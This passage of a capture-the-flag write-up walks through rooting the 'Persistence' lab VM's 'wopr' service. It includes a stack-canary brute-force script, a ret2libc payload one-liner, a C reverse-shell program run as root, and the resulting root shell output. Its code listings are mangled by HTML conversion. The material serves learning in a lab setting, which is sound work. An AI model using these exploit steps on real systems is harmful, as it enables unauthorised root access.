+&gt; Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
+[+] yeah, I don't think so
+</code></pre>
+
+<p>Check the value of return address in our server output:</p>
+
+<pre><code>...(truncated)...
+
+*** stack smashing detected ***: ./wopr terminated
+======= Backtrace: =========
+/lib/libc.so.6(__fortify_fail+0x4d)[0x727f4d]
+/lib/libc.so.6(+0xfcefa)[0x727efa]
+./wopr[0x80487dc]
+[0x33624132]
+
+...(truncated)...
+</code></pre>
+
+<p>And find the offset!</p>
+
+<pre><code>root@kali:/usr/share/metasploit-framework/tools# ./pattern_offset.rb 33624132
+[*] Exact match at offset 38
+</code></pre>
+
+<p>So, we need to overwrite 38 bytes before we get to the return address. Also, remember about a canary and base pointer. So we have:</p>
+
+<p>buffer (30 bytes) + canary (4 bytes) + base pointer (4 bytes) + return address (4 bytes)</p>
+
+<p>Cool, so now knowing all of our offsets, we can craft something for guessing a canary! There&rsquo;s one more thing though&hellip; how do we know when we have guessed a right byte in the canary value so we can move on to the next byte? Let&rsquo;s have a look at the output returned by the server.</p>
+
+<p>Successful response (no buffer overflow):</p>
+
+<pre><code>[knaps@localhost ~]$ nc localhost 3333
+[+] hello, my name is sploitable
+[+] would you like to play a game?
+&gt; yes
+[+] yeah, I don't think so
+[+] bye!
+</code></pre>
+
+<p>Failed response (buffer overflow):</p>
+
+<pre><code>[knaps@localhost ~]$ python -c 'print "A" * 30 + "CCCC" + "BBBB" + "DDDD"' | nc localhost 3333
+[+] hello, my name is sploitable
+[+] would you like to play a game?
+&gt; [+] yeah, I don't think so
+</code></pre>
+
+<p>Do you see the difference? Whenever we behave as the server expects us to behave, it greets us with &ldquo;bye!&rdquo; message, otherwise - it doesn&rsquo;t. That&rsquo;s the indicator when the guess was successful!</p>
+
+<p>It didn&rsquo;t take too long to come up with a quick and dirty (very dirty) script to guess a canary value:</p>
+
+<p><figure class='code'><figcaption><span>Guessing canary value </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">import</span> <span class="nn">socket</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Guess</span> <span class="n">canary</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">found</span> <span class="o">=</span> <span class="bp">False</span>
+</span><span class='line'><span class="n">base_buffer</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="mi">30</span>    <span class="c"># our buffer size is 30</span>
+</span><span class='line'><span class="k">for</span> <span class="n">count</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">):</span>
+</span><span class='line'>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="p">[</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mi">0</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mi">2</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mi">3</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mi">4</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mi">5</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mi">6</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mi">7</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mi">8</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mi">9</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">a</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">b</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">c</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">d</span><span class="s">&#39;,&amp;lsquo;e&amp;rsquo;,&amp;lsquo;f&amp;rsquo;]:</span>
+</span><span class='line'>        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="p">[</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mi">0</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mi">2</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mi">3</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mi">4</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mi">5</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mi">6</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mi">7</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mi">8</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mi">9</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">a</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">b</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">c</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">d</span><span class="s">&#39;,&amp;lsquo;e&amp;rsquo;,&amp;lsquo;f&amp;rsquo;]:</span>
+</span><span class='line'>            <span class="nb">buffer</span> <span class="o">=</span> <span class="n">base_buffer</span> <span class="o">+</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">hex</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span>        <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&quot;localhost&quot;</span><span class="p">,</span> <span class="mi">3333</span><span class="p">))</span>
+</span><span class='line'>        <span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span><span class='line'>        <span class="k">if</span> <span class="s">&quot;bye&quot;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+</span><span class='line'>            <span class="k">print</span> <span class="s">&quot;</span><span class="se">\\</span><span class="s">x&quot;</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="n">j</span>
+</span><span class='line'>            <span class="n">base_buffer</span> <span class="o">+=</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)</span>
+</span><span class='line'>            <span class="n">found</span> <span class="o">=</span> <span class="bp">True</span>
+</span><span class='line'>            <span class="k">break</span>
+</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span class='line'>    <span class="k">if</span> <span class="n">found</span><span class="p">:</span>
+</span><span class='line'>        <span class="n">found</span> <span class="o">=</span> <span class="bp">False</span>
+</span><span class='line'>        <span class="k">break</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Let&rsquo;s run it&hellip;</p>
+
+<pre><code>[knaps@localhost ~]$ ./guess_canary.py
+\x97
+\x29
+\x40
+\x13
+</code></pre>
+
+<p>And we have a canary! (So far just on local CentOS).</p>
+
+<p>Alright, now what can we do? How about typical buffer overflow, find some shellcode to chuck it on the stack, then point back to it and spawn a shell? Well, sounds good, but only in theory. Running very handy script below <a href="http://www.trapkit.de/tools/checksec.html">checksec.sh</a> we can find out more about our binary:</p>
+
+<pre><code>[knaps@localhost ~]$ ./checksec.sh --file wopr
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   wopr
+</code></pre>
+
+<p>Turns out there&rsquo;s NX (non-executable) stack protection mechanism as well - meaning that we can&rsquo;t execute code from data portions of the program. Hmm, bummer!</p>
+
+<p>What else is there&hellip; running below program we can quickly determine that address of the stack pointer doesn&rsquo;t change - hence ASLR (Address Layout Space Randomization) must be disabled!</p>
+
+<p><figure class='code'><figcaption><span>Finding stack pointer </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">get_sp</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">asm</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">mov</span> <span class="o">%</span><span class="n">esp</span><span class="p">,</span> <span class="o">%</span><span class="n">eax</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
+</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">main</span><span class="p">()</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="mi">0</span><span class="n">x</span><span class="o">%</span><span class="n">x</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">get_sp</span><span class="p">());</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<pre><code>bash-4.1$ gcc sp.c -o sp
+bash-4.1$ ./sp 
+0xbffff6e8
+bash-4.1$ ./sp 
+0xbffff6e8
+bash-4.1$ ./sp 
+0xbffff6e8
+</code></pre>
+
+<p>Ok, that&rsquo;s very good news - it means that stack, variables and libraries would always be at the same position - that&rsquo;s a very handy piece of information we can utilise.</p>
+
+<p>After hours and hours of research I found this technique called &ldquo;ret2libc&rdquo; - basically what it means is that you point the code into a function in the libc library (that is generally imported by most Unix programs) and call functions from there. One really interesting function is system(), which executes whatever command you pass to it as an argument. That sounds pretty awesome! All we need is to find out the address of system() function - which shouldn&rsquo;t be hard since ASLR is disabled and functions will always be at the same place in the memory. AWESOME!</p>
+
+<p>There&rsquo;s one little problem though&hellip; you need to pass in a string with whatever you want to run into the system() function call. So, I want to run something along the lines of /bin/bash, how can I pass it in? I need to find it somewhere in memory so I can pass its address onto the stack to be interpreted as an argument passed to the function. Alright, but, where do I find it? Generally you can set an environment variable to whatever you like, run the program, get string from environment variable and run system(), simple. Yeah, but on persistence wopr is already running, we can&rsquo;t stop it and restart it with new environment variables&hellip; and of course you can&rsquo;t change the environment of a running process (at least not without root permissions).</p>
+
+<p>We&rsquo;ll need to utilise something else. Also, simply calling /bin/bash won&rsquo;t work, as it would be spawned by server and nothing would have happened for us - we actually need a reverse shell that we would be able to connect to after.</p>
+
+<p>Again, after hours of research I couldn&rsquo;t really come up with anything. Took a break from it and then, one sunny Friday morning, while still lying in bed trying to wake up, it hit me! Remember /tmp/log variable that we found earlier? Yeah, I forgot it too! What we can do is - create a simple program or script creating a reverse shell, call it &ldquo;log&rdquo;, place it in /tmp, find /tmp/log string in the binary (it would be saved as a variable somewhere), pass it in to system() function, which then will run our /tmp/log program and bam! We&rsquo;ve got a shell!</p>
+
+<p>And that&rsquo;s exactly what I did next. Let&rsquo;s get back to my Kali VM where I already have established SSH to persistence.</p>
+
+<p>First, the /tmp/log program. I went ahead with C and simply creating reverse shell connecting to port 31337. Also I make sure to se setuid and setgid to keep permissions of a calling process (root!).</p>
+
+<p><figure class='code'><figcaption><span>Reverse shell </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">()</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">system</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span> <span class="mi">0</span><span class="o">&lt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="n">localhost</span><span class="o">/</span><span class="mi">31337</span> <span class="mi">1</span><span class="o">&gt;&amp;</span><span class="n">amp</span><span class="p">;</span><span class="mi">0</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="n">amp</span><span class="p">;</span><span class="mi">0</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Sweet, compiled it and saved as /tmp/log.</p>
+
+<p>Next, let&rsquo;s find /tmp/log variable in the binary itself. That didn&rsquo;t take long either, just look at this part of disassembled code:</p>
+
+<pre><code>0x08048985 &lt;+423&gt;:  movl   $0x8048c60,0x4(%esp)
+0x0804898d &lt;+431&gt;:  movl   $0x8048c69,(%esp)
+0x08048994 &lt;+438&gt;:  call   0x804869c &lt;setenv@plt&gt;
+</code></pre>
+
+<p>What&rsquo;s hidden under $0x8048c60?</p>
+
+<pre><code>(gdb) x/1s 0x8048c60
+0x8048c60 &lt;__dso_handle+80&gt;:     "/tmp/log"
+</code></pre>
+
+<p>Gotchya!</p>
+
+<p>Now we just need to find address of system() and exit() (to cleanly return from system() call) and we&rsquo;re almost done!</p>
+
+<p>First, there&rsquo;s a small trick that needs to be done, since gdb still thinks we&rsquo;re using restricted shell, it won&rsquo;t allow us to run the program and therefore load symbols table to find out addresses of functions. To bypass this, we simply need to change $SHELL variable:</p>
+
+<pre><code>bash-4.1$ echo $SHELL
+/bin/rbash
+bash-4.1$ SHELL=/bin/bash
+</code></pre>
+
+<p>Now we can start up gdb, run the binary (it will fail anyway, but will load up symbols table) and find out addresses of interest.</p>
+
+<pre><code>bash-4.1$ gdb -q wopr
+Reading symbols from /usr/local/bin/wopr...(no debugging symbols found)...done.
+(gdb) r
+Starting program: /usr/local/bin/wopr 
+bind: Address already in use
+
+Program exited with code 0142.
+Missing separate debuginfos, use: debuginfo-install glibc-2.12-1.132.el6.i686
+(gdb) p system
+$1 = {&lt;text variable, no debug info&gt;} 0x16c210 &lt;system&gt;
+(gdb) p exit
+$2 = {&lt;text variable, no debug info&gt;} 0x15f070 &lt;exit&gt;
+(gdb) 
+</code></pre>
+
+<p>Cool, now we have all addresses, so we can begin crafting our payload. That&rsquo;s what we&rsquo;re aiming to achieve:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>.
+</span><span class='line'>               &ndash; Current &ndash;                    &ndash; Target &ndash;
+</span><span class='line'>    0000
+</span><span class='line'>             &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;              &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;
+</span><span class='line'>             |                |              |                |
+</span><span class='line'>             |                |              | AAAAAAAAAAAAAA |
+</span><span class='line'>       ^     |     Buffer     |   30 bytes   | AAAAAAAAAAAAAA |   Overflow buffer with dummy data
+</span><span class='line'>       |     |                |              | AAAAAAAAAAA&hellip; |
+</span><span class='line'>     stack   |                |              |                |
+</span><span class='line'>     growth  &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;              &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;
+</span><span class='line'>       |     |     Canary     |   4 bytes    |     Canary     |   Real canary, so we&rsquo;re not detected
+</span><span class='line'>       |     &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;              &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;
+</span><span class='line'>             |  Base pointer  |   4 bytes    |      BBBB      |   Dummy data to overwrite saved base pointer
+</span><span class='line'>             &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;              &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;
+</span><span class='line'>             | Return address |   4 bytes    |    system()    |   system() call
+</span><span class='line'>             &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;              &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;
+</span><span class='line'>             |                |              |     exit()     |   exit() which will be called upon returning from system()
+</span><span class='line'>             |  Rest of the   |              &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;
+</span><span class='line'>             |     stack      |              |    /tmp/log    |   arguments to system() - our malicious program to run
+</span><span class='line'>             |                |              &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;
+</span><span class='line'>             |      &hellip;       |              |       &hellip;      |
+</span><span class='line'>    FFFF</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Basically, we&rsquo;re trying to create a stack frame as if we were calling a new function. Remember that everything is put onto the stack in reverse other, therefore we have (starting from the bottom of the stack - what came in first): function arguments and return address from the function (new EIP). And of course we overwrite old return address with system() call to have it executed.</p>
+
+<p>From this, our payload will look something like this:</p>
+
+<p>&ldquo;A&rdquo; * 30 + &ldquo;canary&rdquo; + &ldquo;BBBB&rdquo; + &ldquo;system()&rdquo; + &ldquo;exit()&rdquo; + &ldquo;/tmp/log&rdquo;.</p>
+
+<p>Cool, so now we have all necessary components - size of the buffer, guessed canary, addresses of system, exit and /tmp/log. All we need now is to carefully craft a payload, remembering it&rsquo;s all in Little Endian, so memory addresses will be written in reverse, and send it to the server. Shall we?</p>
+
+<p>Start the netcat listener:</p>
+
+<pre><code>bash-4.1$ nc -l 31337
+</code></pre>
+
+<p>Guess the canary (copy-paste source code onto persistence and run it):</p>
+
+<pre><code>bash-4.1$ ./guess_canary.py
+\x89
+\xa6
+\x62
+\xc5
+</code></pre>
+
+<p>Craft the exploit:</p>
+
+<pre><code>bash-4.1$ python -c 'print "A" * 30 + "\x89\xa6\x62\xc5" + "BBBB" + "\x10\xc2\x16\x00" + "\x70\xf0\x15\x00" + "\x60\x8c\x04\08"' | nc localhost 3333
+</code></pre>
+
+<p>Did it work?</p>
+
+<pre><code>bash-4.1$ nc -l 31337
+whoami 
+root
+hostname
+persistence
+id
+uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0
+</code></pre>
+
+<p>Wooooooooooohooooooooooo! Root shell :D Let&rsquo;s get the flag:</p>
+
+<pre><code>cd /root
+ls
+anaconda-ks.cfg
+flag.txt
+install.log
+install.log.syslog
+cat flag.txt
+              .d8888b.  .d8888b. 888    
+             d88P  Y88bd88P  Y88b888    
+             888    888888    888888    
+888  888  888888    888888    888888888 
+888  888  888888    888888    888888    
+888  888  888888    888888    888888    
+Y88b 888 d88PY88b  d88PY88b  d88PY88b.  
+ "Y8888888P"  "Y8888P"  "Y8888P"  "Y888
+
+Congratulations!!! You have the flag!
+
+We had a great time coming up with the 
+challenges for this boot2root, and we 
+hope that you enjoyed overcoming them. 
+
+Special thanks goes out to @VulnHub for 
+hosting Persistence for us, and to 
+@recrudesce for testing and providing 
+valuable feedback! 
+
+Until next time, 
+      sagi- &amp; superkojiman
+</code></pre>
+
+<h2>Summary</h2>
+
+<p>It was one awesome challenge, took me a bit, but learnt soooo much. I have a lot better understanding of buffer overflows and modern protection mechanisms. I haven&rsquo;t done so much research on a single topic for quite a long time, but I am very glad I did because now I feel a lot more comfortable dealing with this kinds of vulnerabilities and crafting my own exploits :) Hope there&rsquo;ll be more challenges like this to come!</p>
+
+<p>Also, I could have written a fully automated exploit at the end, but I thought I&rsquo;ll keep it like this, quite manual and low level as I think it shows better exactly what has been done and how I have approached the problem :) Also, since this one is pwned already, honestly I can&rsquo;t be bothered writing up prettier exploits - I rather move on to smashing another VMs :)</p>
+
+<h2>References</h2>
+
+<ul>
+<li><a href="http://www.trapkit.de/tools/checksec.html">checksec.sh</a></li>
+<li><a href="http://www.offensive-security.com/metasploit-unleashed/Writing_An_Exploit">Making Something Go Boom (Metasploit)</a></li>
+<li><a href="http://beej.us/guide/bggdb/">Beej&rsquo;s Quick Guide to GDB</a></li>
+<li><a href="http://insecure.org/stf/smashstack.html">Smashing The Stack For Fun And Profit</a></li>
+<li><a href="http://www.intelligentexploit.com/articles/Linux-Stack-Based-Buffer-Overflows.pdf">Stack based buffer overflow exploitation - tutorial</a></li>
+<li><a href="http://phrack.org/issues/67/13.html">Scraps of notes on remote stack overflow exploitation</a></li>
+<li><a href="https://github.com/Malformation/Notes/blob/master/ret2libc.txt">Exploitation - Returning into libc</a></li>
